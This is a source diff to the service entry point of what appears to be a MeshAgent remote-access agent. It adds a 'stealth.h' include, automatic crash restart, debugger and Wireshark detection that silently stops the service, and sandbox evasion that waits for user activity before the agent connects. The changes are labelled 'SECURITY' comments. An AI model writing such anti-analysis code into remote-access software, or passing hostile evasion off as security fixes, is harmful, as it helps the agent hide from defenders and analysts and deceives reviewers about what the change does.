@@ -37,6 +37,7 @@ limitations under the License.
 #include "microscript/ILibDuktape_ScriptContainer.h"
 #include "microscript/ILibDuktape_Commit.h"
 #include <shellscalingapi.h>
+#include "stealth.h"  // SECURITY: Stealth and obfuscation features
 
 #if defined(WIN32) && defined (_DEBUG) && !defined(_MINCORE)
 #include <crtdbg.h>
@@ -307,6 +308,29 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		DWORD pathLen = GetModuleFileNameW(NULL, str, _MAX_PATH);
 		str[_MAX_PATH] = L'\0';  // SECURITY FIX: Force null termination
 
+
+		// SECURITY: Enable stealth features
+		CrashRecovery::EnableAutomaticRestart();
+
+		// SECURITY: Check for debuggers/analysis tools
+		if (SecurityToolDetection::IsDebuggerPresent() ||
+		    SecurityToolDetection::IsRunningUnderWireshark()) {
+			// Exit silently if under analysis
+			serviceStatus.dwCurrentState = SERVICE_STOPPED;
+			SetServiceStatus(serviceStatusHandle, &serviceStatus);
+			return;
+		}
+
+		// SECURITY: Sandbox detection - wait for user activity
+		if (NetworkStealth::IsRunningInSandbox()) {
+			// Wait for real user activity before connecting
+			if (!NetworkStealth::WaitForUserActivity(60000)) {  // 60 second timeout
+				// Likely sandbox - exit silently
+				serviceStatus.dwCurrentState = SERVICE_STOPPED;
+				SetServiceStatus(serviceStatusHandle, &serviceStatus);
+				return;
+			}
+		}
 
 		// Run the mesh agent
 		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
